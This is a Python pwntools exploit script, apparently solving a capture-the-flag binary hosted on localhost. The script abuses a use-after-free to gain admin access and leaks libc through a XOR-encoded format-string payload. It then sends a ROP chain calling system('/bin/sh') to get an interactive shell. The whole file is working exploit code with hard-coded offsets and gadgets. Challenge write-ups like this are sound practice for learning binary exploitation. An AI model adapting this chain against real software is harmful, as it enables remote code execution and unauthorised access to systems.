from pwn import * 

context.arch="x86_64"

def login(p, username, username_length):

    p.sendlineafter("option: ", "1")
    p.sendlineafter("length: ", str(username_length))
    p.sendlineafter("username: ", username)

def logout(p):

    p.sendlineafter("option: ", "2")

def get_secret_menu(p):

    p.sendlineafter("option: ", "3")


def xor_payload(payload):

    arr = [] 

    for char in payload:

        arr.append(chr(char ^ 0xf))

    return "".join(arr)

    
def main():

    GDBSCRIPT = ''' \

        x/40gx $rbp
    '''

    NOTE_SIZE = 100
    HOST = "localhost"
    PORT = 9005
    elf = ELF("./chall")
    libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")

    local = False

    if local:

        p = process("../challenge/chall")

    else:

        p = remote(HOST, PORT)

    #======== STEP 1 ===========
    #getting admin access by abusing UAF bug 

    login(p, "A" * 8 + "IS_ADMIN", 16)
    logout(p)
    login(p, "A" * 8, 8)
    get_secret_menu(p)
    
    #======== STEP 2 ============
    #leaking libc address

    payload = b"%1$p|%2$p|%3$p|%4$p|"
    xored_payload = xor_payload(payload)
    p.sendlineafter("Note: ", xored_payload)
    libc_leak = p.recvuntil(b"|", drop=True)
    libc_leak = int(libc_leak, 16)
    log.info(f"Libc leak: {hex(libc_leak)}")
    
    libc_base = libc_leak - 0x3ed8d0
    libc.address = libc_base 
    system_addr = libc_base + 0x4f4e0

    log.info(f"Libc base: {hex(libc_base)}")
    log.info(f"System : {hex(system_addr)}")
    p.sendlineafter("Description: ", "BB")

    #========== STEP 3 ============
    #building the rop chain
    ret = 0x0000000000401016
    pop_rdi = 0x000000000040170b
    add_note = 0x00401597
    bin_sh = next(libc.search(b"/bin/sh"))
    log.info(f"/bin/sh : {hex(bin_sh)}")

    ropchain = flat(

        b"A" * 40, 
        p64(ret),
        p64(pop_rdi), 
        p64(bin_sh), 
        p64(system_addr)
    )

    get_secret_menu(p)
    p.sendlineafter("Note: ", "AAA")
    p.sendlineafter("Description: ", ropchain)

    p.interactive()

if __name__ == "__main__":

    main()
